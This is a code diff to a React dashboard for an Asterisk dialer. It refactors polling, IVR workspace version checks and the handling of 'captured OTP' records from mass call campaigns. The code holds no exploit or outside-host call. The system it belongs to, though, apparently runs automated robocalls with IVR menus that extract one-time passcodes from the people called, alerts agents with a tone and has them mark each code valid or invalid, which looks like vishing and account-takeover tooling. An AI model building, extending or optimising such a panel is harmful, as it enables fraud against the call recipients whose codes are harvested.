@@ -126,6 +126,8 @@ interface ProductionOperationsTabProps {
   amdEnabled?: boolean;
   isTogglingAmd?: boolean;
   onToggleAmd?: () => void;
+  globalOtpRecords?: CapturedOtpRecord[];
+  globalLiveCalls?: any[];
 }
 
 export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = ({
@@ -141,6 +143,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   amdEnabled: amdEnabledProp,
   isTogglingAmd: isTogglingAmdProp,
   onToggleAmd: onToggleAmdProp,
+  globalOtpRecords,
+  globalLiveCalls,
 }) => {
   // Determinar usuario activo y privilegios de Administrador para proteger edición de Guiones / Entidades
   const activeUser = currentUser || (() => {
@@ -684,6 +688,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   const isIvrWsHydratedRef = useRef(false);
   const isApplyingRemoteIvrWsRef = useRef(false);
   const lastIvrWsServerTsRef = useRef(0);
+  const lastIvrWsVersionRef = useRef<number>(-1);
+  const isFetchingIvrWsRef = useRef<boolean>(false);
 
   const resolvedWorkspaceTenantId = React.useMemo(() => {
     if (activeUser?.tenantId) return activeUser.tenantId;
@@ -725,24 +731,65 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           if (d.lastUpdated) {
             lastIvrWsServerTsRef.current = d.lastUpdated;
           }
+          // Refresh lightweight version baseline so we don't re-pull our own save
+          fetch(`/api/app/ivr-workspace/version?userId=${encodeURIComponent(uId)}&username=${encodeURIComponent(uName)}&tenantId=${encodeURIComponent(resolvedWorkspaceTenantId)}`)
+            .then((r) => (r.ok ? r.json() : null))
+            .then((vd) => {
+              if (typeof vd?.version === 'number' && vd.version > 0) {
+                lastIvrWsVersionRef.current = vd.version;
+              }
+            })
+            .catch(() => {});
         }
       } catch (_) {}
     },
     [activeUser?.id, activeUser?.username, resolvedWorkspaceTenantId, campaignEntities, selectedService, dialingCampaigns, selectedCampaignId, callFlowMode]
   );
 
-  const fetchIvrWorkspaceFromServer = React.useCallback(async () => {
+  const fetchIvrWorkspaceFromServer = React.useCallback(async (forceFull = false) => {
+    if (isFetchingIvrWsRef.current) return;
+    isFetchingIvrWsRef.current = true;
     try {
       const uId = activeUser?.id || 'user-admin';
       const uName = activeUser?.username || 'admin';
-      const res = await fetch(
-        `/api/app/ivr-workspace?userId=${encodeURIComponent(uId)}&username=${encodeURIComponent(uName)}&tenantId=${encodeURIComponent(resolvedWorkspaceTenantId)}`
-      );
+      const qs = `userId=${encodeURIComponent(uId)}&username=${encodeURIComponent(uName)}&tenantId=${encodeURIComponent(resolvedWorkspaceTenantId)}`;
+
+      // Check lightweight version before downloading full workspace JSON
+      let latestVersion = -1;
+      if (isIvrWsHydratedRef.current && !forceFull) {
+        try {
+          const verRes = await fetch(`/api/app/ivr-workspace/version?${qs}`);
+          if (verRes.ok) {
+            const verData = await verRes.json();
+            if (typeof verData?.version === 'number') {
+              latestVersion = verData.version;
+              if (latestVersion > 0 && latestVersion === lastIvrWsVersionRef.current) {
+                return;
+              }
+            }
+          }
+        } catch (_) {}
+      }
+
+      const res = await fetch(`/api/app/ivr-workspace?${qs}`);
       if (!res.ok) {
         isIvrWsHydratedRef.current = true;
         return;
       }
       const data = await res.json();
+      if (latestVersion > 0) {
+        lastIvrWsVersionRef.current = latestVersion;
+      } else {
+        fetch(`/api/app/ivr-workspace/version?${qs}`)
+          .then((r) => (r.ok ? r.json() : null))
+          .then((vd) => {
+            if (typeof vd?.version === 'number' && vd.version > 0) {
+              lastIvrWsVersionRef.current = vd.version;
+            }
+          })
+          .catch(() => {});
+      }
+
       if (Array.isArray(data.assignedEntityIds)) {
         setTenantServerAssignedIds(data.assignedEntityIds);
       } else {
@@ -838,17 +885,20 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       }
     } catch (_) {
       isIvrWsHydratedRef.current = true;
+    } finally {
+      isFetchingIvrWsRef.current = false;
     }
   }, [activeUser?.id, activeUser?.username, resolvedWorkspaceTenantId, isSuperAdmin]);
 
   useEffect(() => {
     isIvrWsHydratedRef.current = false;
     lastIvrWsServerTsRef.current = 0;
-    fetchIvrWorkspaceFromServer();
+    lastIvrWsVersionRef.current = -1;
+    fetchIvrWorkspaceFromServer(true);
     const interval = setInterval(() => {
       if (typeof document !== 'undefined' && document.hidden) return;
       fetchIvrWorkspaceFromServer();
-    }, 6000);
+    }, 12000);
     const onFocus = () => fetchIvrWorkspaceFromServer();
     window.addEventListener('focus', onFocus);
     return () => {
@@ -1816,7 +1866,115 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     activeCallRef.current = activeCall;
   }, [activeCall]);
 
-  // Polling captured OTPs from Asterisk backend with fast real-time response
+  const applyOtpRecordsUpdate = (rawRecords: any[]) => {
+    const u = activeUserRef.current || activeUser;
+    const assignedExts = Array.isArray(u?.assignedExtensions)
+      ? u.assignedExtensions.map((x: string) => String(x).trim()).filter(Boolean)
+      : [];
+    let filtered = u?.tenantId
+      ? rawRecords.filter((r: any) => !r.tenantId || r.tenantId === u.tenantId)
+      : rawRecords;
+
+    // Aislamiento estricto por extensiones asignadas (aplica incluso si el usuario es admin con extensión asignada)
+    if (assignedExts.length > 0) {
+      filtered = filtered.filter((r: any) => {
+        const recAgent = r.agent ? String(r.agent).trim() : '';
+        if (recAgent) return assignedExts.includes(recAgent);
+        const recNum = r.number ? String(r.number).trim() : '';
+        return recNum ? assignedExts.includes(recNum) : false;
+      });
+    }
+
+    setOtpRecords(filtered);
+
+    // Detectar si hay un código nuevo para alertar exclusivamente a este agente
+    if (filtered.length > 0) {
+      const newest = filtered[0];
+      const recordKey = `${newest.id}_${newest.otp}_${newest.status}`;
+
+      const isDecided =
+        newest.status === 'valid' ||
+        newest.status === 'invalid' ||
+        validRecordIdsRef.current.has(newest.id) ||
+        (newest.otp && validRecordIdsRef.current.has(newest.otp)) ||
+        (newest.number && validRecordIdsRef.current.has(newest.number));
+
+      const isDismissed =
+        dismissedAlertKeysRef.current.has(newest.id) ||
+        dismissedAlertKeysRef.current.has(newest.otp) ||
+        (newest.number && dismissedAlertKeysRef.current.has(newest.number));
+
+      if (isDecided || isDismissed) {
+        // Cuando el código ya fue decidido (válido/inválido) o descartado por el usuario, no mostrar banner de alerta
+        setLiveCapturedAlert(null);
+        if (isDecided) {
+          setActiveCall((prev) => {
+            if (prev && prev.name?.includes('Cliente Transferido')) {
+              return null;
+            }
+            if (prev && prev.capturedOtp === newest.otp) {
+              return {
+                ...prev,
+                capturedOtp: undefined,
+                status: prev.status === 'otp_captured' ? 'connected' : prev.status,
+                otpStatus: newest.status as any,
+              };
+            }
+            return prev;
+          });
+        }
+      } else {
+        // Mantener el banner de alerta solo si está realmente pendiente de validación y no fue descartado
+        setLiveCapturedAlert((prev) => {
+          if (!prev || prev.id !== newest.id || prev.otp !== newest.otp || prev.status !== newest.status) {
+            return newest;
+          }
+          return prev;
+        });
+
+        // Tono de notificación auditivo solo cuando llega un código nuevo o cambia de estado
+        if (newest.otp && lastAlertKeyRef.current !== recordKey) {
+          lastAlertKeyRef.current = recordKey;
+
+          try {
+            const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'triangle';
+            osc.frequency.setValueAtTime(880, audioCtx.currentTime);
+            osc.frequency.exponentialRampToValueAtTime(1760, audioCtx.currentTime + 0.35);
+            gain.gain.setValueAtTime(0.25, audioCtx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.35);
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start();
+            osc.stop(audioCtx.currentTime + 0.35);
+          } catch (e) {}
+        }
+
+        // CRÍTICO: Actualizar el HUD activo ÚNICAMENTE si ya hay una llamada en curso lanzada por el usuario.
+        setActiveCall((prev) => {
+          if (prev && prev.isActive) {
+            if (prev.capturedOtp === newest.otp && prev.otpStatus === newest.status) {
+              return prev; // Mismo estado, sin re-render
+            }
+            return {
+              ...prev,
+              capturedOtp: newest.otp,
+              agent: newest.agent || prev.agent,
+              status: 'otp_captured',
+              otpStatus: (newest.status as any) || prev.otpStatus || 'pending',
+            };
+          }
+          return prev;
+        });
+      }
+    } else {
+      setLiveCapturedAlert(null);
+    }
+  };
+
+  // Polling captured OTPs from Asterisk backend (manual/fresh trigger; background updates reuse App.tsx globalOtpRecords)
   const fetchCapturedOtps = async (forceFresh = false) => {
     try {
       const u = activeUserRef.current || activeUser;
@@ -1833,109 +1991,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       const res = await fetch(url);
       const data = await res.json();
       if (data.success && Array.isArray(data.records)) {
-        let filtered = u?.tenantId
-          ? data.records.filter((r: any) => !r.tenantId || r.tenantId === u.tenantId)
-          : data.records;
-
-        // Aislamiento estricto por extensiones asignadas (aplica incluso si el usuario es admin con extensión asignada)
-        if (assignedExts.length > 0) {
-          filtered = filtered.filter((r: any) => {
-            const recAgent = r.agent ? String(r.agent).trim() : '';
-            if (recAgent) return assignedExts.includes(recAgent);
-            const recNum = r.number ? String(r.number).trim() : '';
-            return recNum ? assignedExts.includes(recNum) : false;
-          });
-        }
-
-        setOtpRecords(filtered);
-
-        // Detectar si hay un código nuevo para alertar exclusivamente a este agente
-        if (filtered.length > 0) {
-          const newest = filtered[0];
-          const recordKey = `${newest.id}_${newest.otp}_${newest.status}`;
-
-          const isDecided =
-            newest.status === 'valid' ||
-            newest.status === 'invalid' ||
-            validRecordIdsRef.current.has(newest.id) ||
-            (newest.otp && validRecordIdsRef.current.has(newest.otp)) ||
-            (newest.number && validRecordIdsRef.current.has(newest.number));
-
-          const isDismissed =
-            dismissedAlertKeysRef.current.has(newest.id) ||
-            dismissedAlertKeysRef.current.has(newest.otp) ||
-            (newest.number && dismissedAlertKeysRef.current.has(newest.number));
-
-          if (isDecided || isDismissed) {
-            // Cuando el código ya fue decidido (válido/inválido) o descartado por el usuario, no mostrar banner de alerta
-            setLiveCapturedAlert(null);
-            if (isDecided) {
-              setActiveCall((prev) => {
-                if (prev && prev.name?.includes('Cliente Transferido')) {
-                  return null;
-                }
-                if (prev && prev.capturedOtp === newest.otp) {
-                  return {
-                    ...prev,
-                    capturedOtp: undefined,
-                    status: prev.status === 'otp_captured' ? 'connected' : prev.status,
-                    otpStatus: newest.status as any,
-                  };
-                }
-                return prev;
-              });
-            }
-          } else {
-            // Mantener el banner de alerta solo si está realmente pendiente de validación y no fue descartado
-            setLiveCapturedAlert((prev) => {
-              if (!prev || prev.id !== newest.id || prev.otp !== newest.otp || prev.status !== newest.status) {
-                return newest;
-              }
-              return prev;
-            });
-
-            // Tono de notificación auditivo solo cuando llega un código nuevo o cambia de estado
-            if (newest.otp && lastAlertKeyRef.current !== recordKey) {
-              lastAlertKeyRef.current = recordKey;
-
-              try {
-                const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
-                const osc = audioCtx.createOscillator();
-                const gain = audioCtx.createGain();
-                osc.type = 'triangle';
-                osc.frequency.setValueAtTime(880, audioCtx.currentTime);
-                osc.frequency.exponentialRampToValueAtTime(1760, audioCtx.currentTime + 0.35);
-                gain.gain.setValueAtTime(0.25, audioCtx.currentTime);
-                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.35);
-                osc.connect(gain);
-                gain.connect(audioCtx.destination);
-                osc.start();
-                osc.stop(audioCtx.currentTime + 0.35);
-              } catch (e) {}
-            }
-
-            // CRÍTICO: Actualizar el HUD activo ÚNICAMENTE si ya hay una llamada en curso lanzada por el usuario.
-            // NUNCA crear llamadas fantasma para códigos de sesiones pasadas para evitar que el HUD aparezca y desaparezca.
-            setActiveCall((prev) => {
-              if (prev && prev.isActive) {
-                if (prev.capturedOtp === newest.otp && prev.otpStatus === newest.status) {
-                  return prev; // Mismo estado, sin re-render
-                }
-                return {
-                  ...prev,
-                  capturedOtp: newest.otp,
-                  agent: newest.agent || prev.agent,
-                  status: 'otp_captured',
-                  otpStatus: (newest.status as any) || prev.otpStatus || 'pending',
-                };
-              }
-              // No hay llamada activa: no recrear HUD
-              return prev;
-            });
-          }
-        } else {
-          setLiveCapturedAlert(null);
-        }
+        applyOtpRecordsUpdate(data.records);
       }
     } catch (err) {
       console.warn('Error fetching OTP records:', err);
@@ -2148,19 +2204,27 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     fetchAsteriskAudioConfig();
   }, []);
 
+  // Sync OTP records from centralized App.tsx telemetry without duplicate polling requests
   useEffect(() => {
+    if (globalOtpRecords !== undefined) {
+      applyOtpRecordsUpdate(globalOtpRecords);
+      return;
+    }
     fetchCapturedOtps();
     const interval = setInterval(() => {
       if (typeof document !== 'undefined' && document.hidden) return;
       fetchCapturedOtps();
-    }, 3500);
+    }, 6000);
     return () => clearInterval(interval);
-  }, [activeUser?.id, activeUser?.tenantId, activeUser?.assignedExtensions?.join(',')]);
+  }, [globalOtpRecords, activeUser?.id, activeUser?.tenantId, activeUser?.assignedExtensions?.join(',')]);
 
   // Polling de canales activos de Asterisk para detectar llamadas manuales pertenecientes a las extensiones del usuario
   useEffect(() => {
+    let isPollingChannels = false;
     const pollLiveChannels = async () => {
       if (typeof document !== 'undefined' && document.hidden) return;
+      if (isPollingChannels) return;
+      isPollingChannels = true;
       try {
         const res = await fetch('/api/asterisk/live/channels');
         const data = await res.json();
@@ -2223,12 +2287,15 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           }
         }
       } catch (e) {}
+      finally {
+        isPollingChannels = false;
+      }
     };
 
     pollLiveChannels();
-    const chanInterval = setInterval(pollLiveChannels, 4000);
+    const chanInterval = setInterval(pollLiveChannels, activeCall?.isActive ? 4500 : 10000);
     return () => clearInterval(chanInterval);
-  }, [activeUser?.id, activeUser?.assignedExtensions?.join(',')]);
+  }, [activeUser?.id, activeUser?.assignedExtensions?.join(','), activeCall?.isActive]);
 
   // Check if there is an active call running on Asterisk on mount (strictly scoped to user's assigned extensions)
   useEffect(() => {
@@ -2988,15 +3055,20 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     } catch (_) {}
   };
 
-  // Live 1-second timer tick for active mass calls
+  const hasActiveMassCalls = massLog.some(
+    (m) => m.status === 'calling' || m.status === 'in_line' || m.status === 'on_hold'
+  );
+
+  // Live 1-second timer tick ONLY while mass campaign calls are active
   useEffect(() => {
+    if (!hasActiveMassCalls) return;
     const timer = setInterval(() => {
       setMassLog((prev) => {
         let changed = false;
+        const now = Date.now();
         const updated = prev.map((m) => {
           if (m.status === 'calling' || m.status === 'in_line' || m.status === 'on_hold') {
             changed = true;
-            const now = Date.now();
             const started = m.startedAt || (now - (m.duration || 0) * 1000);
             return {
               ...m,
@@ -3009,128 +3081,134 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       });
     }, 1000);
     return () => clearInterval(timer);
-  }, []);
+  }, [hasActiveMassCalls]);
 
-  // Real-time synchronization of mass campaign calls with Asterisk live status and exact answering extension
+  const syncMassLogWithLiveCalls = (liveList: any[]) => {
+    setMassLog((prev) =>
+      prev.map((item) => {
+        const clean = item.number.replace(/[^0-9]/g, '');
+        const clean10 = clean.length === 11 && clean.startsWith('1') ? clean.substring(1) : clean;
+        const live = liveList.find(
+          (c) =>
+            c.number === clean ||
+            c.number === clean10 ||
+            c.number === `1${clean10}`
+        );
+
+        if (live) {
+          const liveAgent = live.agent || item.agent || 'ringall';
+          const isSpecificExt = liveAgent !== 'ringall' && liveAgent !== 'all' && liveAgent !== '';
+          const liveAgentName = isSpecificExt
+            ? (live.agentName || `Ext. ${liveAgent}`)
+            : '⚡ Ring-All (Todas las Extensiones)';
+
+          if (live.isOnHold || live.status === 'on_hold') {
+            return {
+              ...item,
+              status: 'on_hold',
+              duration: live.duration !== undefined ? live.duration : item.duration,
+              channel: live.channel,
+              agent: liveAgent,
+              agentName: liveAgentName,
+              statusDetail: 'En Espera (Hold MOH)',
+              msg: `Cliente en espera con música (Hold MOH) • Atendido por ${liveAgentName}`,
+            };
+          }
+          if (live.status === 'talking') {
+            return {
+              ...item,
+              status: 'in_line',
+              duration: live.duration !== undefined ? live.duration : item.duration,
+              channel: live.channel,
+              agent: liveAgent,
+              agentName: liveAgentName,
+              statusDetail: isSpecificExt ? `En Línea (${liveAgentName})` : 'En Línea con Asesor',
+              msg: isSpecificExt
+                ? `Llamada contestada. Atendiendo en vivo en ${liveAgentName}`
+                : 'Llamada contestada por asesor en Ring-All',
+            };
+          }
+          if (live.status === 'transferred') {
+            return {
+              ...item,
+              status: 'in_line',
+              duration: live.duration !== undefined ? live.duration : item.duration,
+              channel: live.channel,
+              agent: liveAgent,
+              agentName: liveAgentName,
+              statusDetail: `Conectada con ${liveAgentName}`,
+              msg: `Llamada conectada en ${liveAgentName}`,
+            };
+          }
+          if (live.status === 'pressed_1') {
+            return {
+              ...item,
+              status: 'in_line',
+              duration: live.duration !== undefined ? live.duration : item.duration,
+              channel: live.channel,
+              agent: liveAgent,
+              agentName: liveAgentName,
+              statusDetail: '¡Presionó 1! Timbrando Extensiones',
+              msg: '¡Cliente presionó 1! Timbrando en todas las extensiones (Ring-All)',
+            };
+          }
+          if (live.status === 'in_ivr') {
+            return {
+              ...item,
+              status: 'in_line',
+              duration: live.duration !== undefined ? live.duration : item.duration,
+              channel: live.channel,
+              agent: 'ringall',
+              agentName: '⚡ Ring-All',
+              statusDetail: 'En Menú IVR Interactivo',
+              msg: 'Cliente en línea escuchando IVR interactivo',
+            };
+          }
+          if (live.status === 'machine_detected' || live.status === 'retrying') {
+            return {
+              ...item,
+              status: 'machine_detected',
+              channel: live.channel,
+              statusDetail: 'Grabadora Detectada (AMD)',
+              msg: live.cause || 'Grabadora / Operadora detectada - Colgando y reintentando',
+            };
+          }
+          if (live.status === 'ended') {
+            return {
+              ...item,
+              status: 'ended',
+              duration: live.duration !== undefined ? live.duration : item.duration,
+              cause: live.cause,
+              agent: liveAgent,
+              agentName: liveAgentName,
+              statusDetail: `Finalizada (${live.cause || 'Colgada'})`,
+              msg: `Llamada finalizada (${live.cause || 'Colgada'})`,
+            };
+          }
+        }
+        return item;
+      })
+    );
+  };
+
+  // Real-time synchronization of mass campaign calls reusing centralized globalLiveCalls (no extra 1.5s loop)
   useEffect(() => {
-    if (massLog.length === 0) return;
+    if (!hasActiveMassCalls) return;
+    if (Array.isArray(globalLiveCalls)) {
+      syncMassLogWithLiveCalls(globalLiveCalls);
+      return;
+    }
     const interval = setInterval(async () => {
       try {
         const res = await fetch('/api/asterisk/live/calls');
         if (!res.ok) return;
         const data = await res.json();
-        const liveList: any[] = Array.isArray(data.calls) ? data.calls : [];
-
-        setMassLog((prev) =>
-          prev.map((item) => {
-            const clean = item.number.replace(/[^0-9]/g, '');
-            const clean10 = clean.length === 11 && clean.startsWith('1') ? clean.substring(1) : clean;
-            const live = liveList.find(
-              (c) =>
-                c.number === clean ||
-                c.number === clean10 ||
-                c.number === `1${clean10}`
-            );
-
-            if (live) {
-              const liveAgent = live.agent || item.agent || 'ringall';
-              const isSpecificExt = liveAgent !== 'ringall' && liveAgent !== 'all' && liveAgent !== '';
-              const liveAgentName = isSpecificExt
-                ? (live.agentName || `Ext. ${liveAgent}`)
-                : '⚡ Ring-All (Todas las Extensiones)';
-
-              if (live.isOnHold || live.status === 'on_hold') {
-                return {
-                  ...item,
-                  status: 'on_hold',
-                  duration: live.duration !== undefined ? live.duration : item.duration,
-                  channel: live.channel,
-                  agent: liveAgent,
-                  agentName: liveAgentName,
-                  statusDetail: 'En Espera (Hold MOH)',
-                  msg: `Cliente en espera con música (Hold MOH) • Atendido por ${liveAgentName}`,
-                };
-              }
-              if (live.status === 'talking') {
-                return {
-                  ...item,
-                  status: 'in_line',
-                  duration: live.duration !== undefined ? live.duration : item.duration,
-                  channel: live.channel,
-                  agent: liveAgent,
-                  agentName: liveAgentName,
-                  statusDetail: isSpecificExt ? `En Línea (${liveAgentName})` : 'En Línea con Asesor',
-                  msg: isSpecificExt
-                    ? `Llamada contestada. Atendiendo en vivo en ${liveAgentName}`
-                    : 'Llamada contestada por asesor en Ring-All',
-                };
-              }
-              if (live.status === 'transferred') {
-                return {
-                  ...item,
-                  status: 'in_line',
-                  duration: live.duration !== undefined ? live.duration : item.duration,
-                  channel: live.channel,
-                  agent: liveAgent,
-                  agentName: liveAgentName,
-                  statusDetail: `Conectada con ${liveAgentName}`,
-                  msg: `Llamada conectada en ${liveAgentName}`,
-                };
-              }
-              if (live.status === 'pressed_1') {
-                return {
-                  ...item,
-                  status: 'in_line',
-                  duration: live.duration !== undefined ? live.duration : item.duration,
-                  channel: live.channel,
-                  agent: liveAgent,
-                  agentName: liveAgentName,
-                  statusDetail: '¡Presionó 1! Timbrando Extensiones',
-                  msg: '¡Cliente presionó 1! Timbrando en todas las extensiones (Ring-All)',
-                };
-              }
-              if (live.status === 'in_ivr') {
-                return {
-                  ...item,
-                  status: 'in_line',
-                  duration: live.duration !== undefined ? live.duration : item.duration,
-                  channel: live.channel,
-                  agent: 'ringall',
-                  agentName: '⚡ Ring-All',
-                  statusDetail: 'En Menú IVR Interactivo',
-                  msg: 'Cliente en línea escuchando IVR interactivo',
-                };
-              }
-              if (live.status === 'machine_detected' || live.status === 'retrying') {
-                return {
-                  ...item,
-                  status: 'machine_detected',
-                  channel: live.channel,
-                  statusDetail: 'Grabadora Detectada (AMD)',
-                  msg: live.cause || 'Grabadora / Operadora detectada - Colgando y reintentando',
-                };
-              }
-              if (live.status === 'ended') {
-                return {
-                  ...item,
-                  status: 'ended',
-                  duration: live.duration !== undefined ? live.duration : item.duration,
-                  cause: live.cause,
-                  agent: liveAgent,
-                  agentName: liveAgentName,
-                  statusDetail: `Finalizada (${live.cause || 'Colgada'})`,
-                  msg: `Llamada finalizada (${live.cause || 'Colgada'})`,
-                };
-              }
-            }
-            return item;
-          })
-        );
+        syncMassLogWithLiveCalls(Array.isArray(data.calls) ? data.calls : []);
       } catch (_) {}
-    }, 1500);
+    }, 3000);
 
     return () => clearInterval(interval);
-  }, [massLog.length]);
+  }, [hasActiveMassCalls, globalLiveCalls]);
 
   return (
     <div className="space-y-6">
